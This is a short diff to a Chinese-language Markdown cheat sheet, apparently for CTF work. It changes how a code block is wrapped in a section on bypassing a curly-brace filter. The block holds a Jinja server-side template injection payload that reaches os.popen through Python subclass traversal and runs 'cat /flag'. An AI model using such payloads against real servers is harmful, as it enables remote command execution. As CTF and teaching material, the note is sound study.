@@ -135,12 +135,14 @@ file、subprocess.Popen、os.popen、exec、eval
 
 - ## 过滤大括号
 
-  ~~~markdown
+  ````
   使用{%%}替代{{}}，payload:
+  <!-- {% raw %} -->
   ```liquid
-  {% raw %}{% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) %}{% endraw %}
+  {% print(''.__class__.__base__.__subclasses__()[xx].__init__.__globals__['popen']('cat /flag').read()) %}
   ```
-  ~~~
+  <!-- {% endraw %} -->
+  ````
 
 - ## 过滤引号
 
